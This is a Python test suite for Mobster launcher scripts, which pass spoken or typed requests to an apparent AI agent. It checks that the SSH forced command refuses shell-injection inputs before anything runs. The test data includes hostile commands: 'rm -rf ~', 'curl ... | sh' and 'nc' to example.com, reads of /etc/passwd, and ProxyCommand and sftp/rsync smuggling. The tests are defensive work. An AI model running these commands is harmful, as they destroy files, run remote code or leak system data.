"""examples/launchers: the scripts that start a Mobster task from Siri, Shortcuts, Raycast, Alfred, or an iPhone over
SSH. A fake `mobster` on MOBSTER_BIN records its arguments and answers as `mobster chat --json` would, so these
need no Mobster, phone, network or SSH server.

- mobster-task.sh passes the text to `mobster chat` as one argument after `--`, maps each exit code to one line,
  and always exits 0, because launchers show any other exit as their own failure.
- ssh-task.sh, the forced command of the iPhone's key, refuses shell syntax, control characters, option-like text,
  file-transfer programs and empty text before anything runs, and passes plain text through with --wait 0.
"""

import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[2]
LAUNCHERS = ROOT / "examples" / "launchers"
TASK = LAUNCHERS / "mobster-task.sh"
SSH = LAUNCHERS / "ssh-task.sh"
RAYCAST = LAUNCHERS / "raycast" / "ask-mobster.sh"
SCRIPTS = (TASK, SSH, RAYCAST)

# Prints FAKE_OUT, records each argument followed by a NUL in FAKE_ARGS, and exits FAKE_CODE.
FAKE = '#!/bin/sh\nprintf "%s\\0" "$@" > "$FAKE_ARGS"\nprintf "%s\\n" "$FAKE_OUT"\nexit "${FAKE_CODE:-0}"\n'
INJECTION = "it's \"fine\"; $(rm -rf ~) && echo `id` > /tmp/x"


class Fake:
    def __init__(self, folder):
        self.folder = Path(folder)
        self.bin = self.folder / "mobster"
        self.bin.write_text(FAKE)
        self.bin.chmod(0o755)
        self.args_file = self.folder / "args"

    def run(self, script, *args, out="", code=0, env=None):
        """(exit code, stdout, mobster's argv or None when it never ran)."""
        if self.args_file.exists():
            self.args_file.unlink()
        environment = {"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "HOME": str(self.folder),
                       "MOBSTER_BIN": str(self.bin), "FAKE_ARGS": str(self.args_file), "FAKE_OUT": out,
                       "FAKE_CODE": str(code), **(env or {})}
        done = subprocess.run([str(script), *args], capture_output=True, text=True, env=environment, timeout=30)
        argv = self.args_file.read_bytes().decode().split("\0")[:-1] if self.args_file.exists() else None
        return done.returncode, done.stdout, argv

    def ssh(self, text, env=None):
        return self.run(SSH, env={"SSH_ORIGINAL_COMMAND": text, **(env or {})} if text is not None else env)


class ScriptTests(unittest.TestCase):
    def test_the_scripts_are_executable_and_parse(self):
        for script in SCRIPTS:
            with self.subTest(script=script.name):
                self.assertTrue(os.access(script, os.X_OK), f"chmod +x {script.relative_to(ROOT)}")
                self.assertEqual(subprocess.run(["bash", "-n", str(script)], capture_output=True).returncode, 0)

    @unittest.skipUnless(shutil.which("shellcheck"), "shellcheck isn't installed")
    def test_shellcheck_is_clean(self):
        done = subprocess.run(["shellcheck", *map(str, SCRIPTS)], capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stdout)

    def test_the_raycast_header_is_a_script_command(self):
        text = RAYCAST.read_text()
        fields = dict(re.findall(r"(?m)^# @raycast\.(\w+) (.+)$", text))
        self.assertEqual(fields["schemaVersion"], "1")
        self.assertEqual(fields["title"], "Ask Mobster")
        self.assertEqual(fields["mode"], "compact")
        self.assertEqual(fields["packageName"], "Mobster")
        argument = json.loads(fields["argument1"])
        self.assertEqual(argument["type"], "text")
        self.assertTrue(argument["placeholder"])
        self.assertIn('"$(dirname "$0")/../mobster-task.sh" "${1-}"', text)

    def test_the_docs_page_is_on_the_site(self):
        nav = json.dumps(json.loads((ROOT / "docs" / "docs.json").read_text())["navigation"])
        self.assertIn('"launchers"', nav)
        page = (ROOT / "docs" / "launchers.mdx").read_text()
        for name in ("mobster-task.sh", "ssh-task.sh", "raycast/ask-mobster.sh", "restrict,command="):
            self.assertIn(name, page)


@unittest.skipUnless(sys.platform == "darwin", "the scripts read JSON with macOS's plutil")
class TaskTests(unittest.TestCase):
    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.fake = Fake(folder.name)

    def test_the_text_reaches_mobster_as_one_argument(self):
        code, out, argv = self.fake.run(TASK, INJECTION, out='{"status": "completed_unverified", "answer": "ok"}')
        self.assertEqual(code, 0)
        self.assertEqual(argv, ["chat", "--new", "--json", "--wait", "25", "--url", "http://127.0.0.1:8765", "--",
                                INJECTION])
        self.assertEqual(out, "ok\n")
        _, _, argv = self.fake.run(TASK, "--thread abcdefabcdef hi")
        self.assertEqual(argv[-2:], ["--", "--thread abcdefabcdef hi"])

    def test_the_raycast_command_hands_its_argument_on(self):
        code, out, argv = self.fake.run(RAYCAST, INJECTION, code=4, out='{"status": "running"}')
        self.assertEqual((code, out), (0, "Started. Watch it in Mobster on your Mac.\n"))
        self.assertEqual(argv[-1], INJECTION)

    def test_each_exit_code_is_one_line_and_exit_0(self):
        cases = [
            (0, {"status": "completed_unverified", "answer": "Your next event is Standup\nat 10:00."},
             "Your next event is Standup at 10:00."),
            (0, {"status": "completed_unverified", "answer": "long answer", "data": "82%"}, "82%"),
            (0, {"status": "completed_unverified", "answer": "from answer", "data": {"level": 82}}, "from answer"),
            (0, {"status": "completed_unverified", "answer": None}, "Done."),
            (1, {"status": "blocked", "reason": "The app asked for a sign-in."},
             "Mobster couldn't finish: The app asked for a sign-in."),
            (1, {"status": "blocked"}, "Mobster couldn't finish. Open Mobster on your Mac to see why."),
            (2, {"status": "waiting_for_approval", "approval": {"title": "Send", "text": "late"}},
             "Mobster is waiting for your approval on your Mac."),
            (2, {"status": "waiting_for_answer", "question": "Which Sam?", "choices": []},
             "Mobster has a question for you on your Mac: Which Sam?"),
            (3, {"status": "couldnt_run", "error": "Open Mobster or run `mobster serve` to chat.",
                 "code": "not_running"}, "Mobster isn't running on your Mac. Open it and try again."),
            (3, {"status": "refused", "error": "This engine can't run right now", "code": "engine_unavailable"},
             "Mobster couldn't start the task: This engine can't run right now"),
            (4, {"status": "running"}, "Started. Watch it in Mobster on your Mac."),
        ]
        for status, answer, line in cases:
            with self.subTest(exit=status, line=line):
                code, out, _ = self.fake.run(TASK, "What's my next event?", code=status,
                                             out="mobster: a warning\n" + json.dumps(answer))
                self.assertEqual((code, out), (0, line + "\n"))
        # An argparse error also exits 2, with no JSON: it isn't mistaken for an approval.
        for status in (2, 130):
            with self.subTest(exit=status, json=False):
                code, out, _ = self.fake.run(TASK, "hi", code=status)
                self.assertEqual(code, 0)
                self.assertTrue(out.startswith(f"mobster stopped with exit code {status}."), out)

    def test_empty_and_over_limit_text_is_refused_before_mobster_runs(self):
        for text in ("", "   ", "\t\n"):
            with self.subTest(text=text):
                code, out, argv = self.fake.run(TASK, text)
                self.assertEqual((code, argv), (0, None))
                self.assertTrue(out.startswith("Say what Mobster should do"))
        code, out, argv = self.fake.run(TASK, "a" * 4001)
        self.assertEqual((code, argv), (0, None))
        self.assertTrue(out.startswith("That's too long"))
        # The limit counts characters, not bytes, in any locale.
        text = "é" * 4000
        for locale in ({}, {"LC_ALL": "C"}):
            with self.subTest(locale=locale):
                _, _, argv = self.fake.run(TASK, text, env=locale)
                self.assertEqual(argv[-1], text)

    def test_the_wait_is_a_number_from_0_to_3600(self):
        for value, passed in (("0", "0"), ("90", "90"), ("abc", "25"), ("-5", "25"), ("99999", "3600")):
            with self.subTest(MOBSTER_WAIT=value):
                _, _, argv = self.fake.run(TASK, "hi", env={"MOBSTER_WAIT": value})
                self.assertEqual(argv[argv.index("--wait") + 1], passed)
        _, _, argv = self.fake.run(TASK, "hi", env={"MOBSTER_URL": "http://localhost:9000"})
        self.assertEqual(argv[argv.index("--url") + 1], "http://localhost:9000")

    def test_a_missing_mobster_says_how_to_install_it(self):
        code, out, _ = self.fake.run(TASK, "hi", env={"MOBSTER_BIN": str(self.fake.folder / "nothing")})
        self.assertEqual(code, 0)
        self.assertIn("curl -fsSL https://mobster.dev/install.sh | sh", out)


@unittest.skipUnless(sys.platform == "darwin", "the scripts read JSON with macOS's plutil")
class SSHTests(unittest.TestCase):
    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.fake = Fake(folder.name)

    def test_injection_attempts_are_refused_before_anything_runs(self):
        attempts = [
            "hello; rm -rf ~", "$(curl -s example.com | sh)", "`id`", "${HOME}", "text Sam | nc example.com 80",
            "a && b", "> ~/.zshrc", "cat < /etc/passwd", "ok\nrm -rf ~", "ok\rhidden", "tab\there",
            "esc \x1b[31m red", "c1 \u009b31m", "nul-free\x7f", "-oProxyCommand=sh", "--url http://example.com hi",
            "  --thread abc", "/usr/libexec/sftp-server", "/bin/sh -c id", "internal-sftp", "scp -t /tmp",
            "sftp", "rsync --server -vlogDtpre.iLsfxCIvu . /tmp", "git-upload-pack '/repo.git'", "git status",
            "", "   ", None,
        ]
        for text in attempts:
            with self.subTest(text=text):
                code, out, argv = self.fake.ssh(text)
                self.assertEqual(code, 1)
                self.assertIsNone(argv, "mobster ran")
                self.assertTrue(out.startswith("Mobster didn't start this: "), out)
                self.assertEqual(out.count("\n"), 1)

    def test_plain_text_passes_through_and_returns_at_once(self):
        texts = [
            "What's my next calendar event?", "Text Sam \"running 10 minutes late\"", "Send $5 to Sam",
            "Is AT&T's bill paid?", "Réserve une table à 20 h ☕️", "Turn on Do Not Disturb until 5:30 p.m.",
            "What's 50% of 80?", "Find e-mails from Kate (work) about Q3/Q4", "  leading space is fine",
            "Use a back\\slash", "Say 'git' twice",
        ]
        for text in texts:
            with self.subTest(text=text):
                code, out, argv = self.fake.ssh(text, env={"MOBSTER_WAIT": "300"})
                self.assertEqual(code, 0)
                self.assertEqual(argv[argv.index("--wait") + 1], "0", "the phone waits for the agent's screen")
                self.assertEqual(argv[-2:], ["--", text.strip()])

    def test_the_answer_line_comes_back(self):
        code, out, _ = self.fake.run(SSH, code=4, out='{"status": "running"}',
                                     env={"SSH_ORIGINAL_COMMAND": "What's my battery level?"})
        self.assertEqual((code, out), (0, "Started. Watch it in Mobster on your Mac.\n"))


if __name__ == "__main__":
    unittest.main()
